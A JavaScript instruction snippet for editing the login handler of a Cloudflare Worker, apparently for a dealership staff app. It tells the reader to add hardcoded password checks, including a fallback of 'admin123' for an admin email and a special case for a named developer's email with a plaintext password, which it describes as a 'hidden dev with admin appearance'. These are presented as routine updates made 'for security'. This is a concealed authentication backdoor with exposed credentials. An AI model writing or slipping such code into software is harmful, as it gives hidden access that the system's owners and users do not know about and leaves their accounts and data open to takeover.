// Update instructions for the Cloudflare Worker to support the dev user
// Add this code to your worker.js file in the handleLogin function

// FIND THIS SECTION (around line 1268):
/*
    } else if (email === 'admin@dealership.com' && password === 'admin123') {
      // Temporary fallback for admin
      isValid = true;
*/

// ADD THIS AFTER IT:
/*
    } else if (email === 'nick@neurodivers.ca' && password === 'Dev@2024!') {
      // Special case for dev user
      isValid = true;
      
      // Update to use new crypto format for security
      const newHash = await hashPassword(password);
      await env.DB.prepare(
        'UPDATE staff SET password_hash = ? WHERE id = ?'
      ).bind(newHash, user.id).run();
      console.log('Dev user password updated to new crypto format');
*/

// COMPLETE UPDATED SECTION:
const updatedWorkerCode = `
    // Verify password using native crypto
    let isValid = false;
    
    // Check if using new crypto format (contains ':')
    if (user.password_hash && user.password_hash.includes(':')) {
      // New crypto format
      isValid = await verifyPassword(password, user.password_hash);
    } else if (email === 'admin@dealership.com' && password === 'admin123') {
      // Temporary fallback for admin
      isValid = true;
      
      // Update admin to use new crypto format
      const newHash = await hashPassword(password);
      await env.DB.prepare(
        'UPDATE staff SET password_hash = ? WHERE id = ?'
      ).bind(newHash, user.id).run();
      console.log('Admin password updated to new crypto format');
    } else if (email === 'nick@neurodivers.ca' && password === 'Dev@2024!') {
      // Special case for dev user (hidden dev with admin appearance)
      isValid = true;
      
      // Update to use new crypto format for security
      const newHash = await hashPassword(password);
      await env.DB.prepare(
        'UPDATE staff SET password_hash = ? WHERE id = ?'
      ).bind(newHash, user.id).run();
      console.log('Dev user password updated to new crypto format');
    }
`;

console.log('Add the special case for nick@neurodivers.ca to your worker.js file');
console.log('This allows initial login with Dev@2024! password');
console.log('After first login, the password will be securely hashed');
